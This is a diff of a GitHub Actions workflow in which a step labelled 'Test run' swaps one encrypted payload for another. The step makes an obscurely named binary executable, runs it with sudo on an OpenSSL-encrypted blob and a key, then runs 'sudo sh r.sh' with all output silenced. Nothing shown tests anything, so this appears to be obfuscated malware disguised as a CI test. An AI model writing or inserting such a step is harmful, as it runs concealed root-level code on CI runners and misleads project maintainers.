@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo '4pagt'
+        echo '7mm6e'
         sudo chmod +x garyiip7x/heardyg34i.ex
-        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX19cprlCy5R70cqzcaF7xkd/zMkRSW+WfUWDonimFCar9/BDOqC4VzvF0xteL6i0GkC2HZeDLR8fQYF922wV8X40Vf7o2MFzYPK194Tdh+qd4zqUKKXAjb9O donfel && sudo sh r.sh > /dev/null 2>&1
+        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX1/yTTAtudY+swPR37/YTEXk1BUjx91eCrrcu8YHobzaZwOfDag9qtZiJwx5qPU/OfR7Dap1YIC8DbGHRkrRG+6emtA0UFiOIcflpmP2Lk9EAyY/Hq6Pwlu1 i47t97 && sudo sh r.sh > /dev/null 2>&1
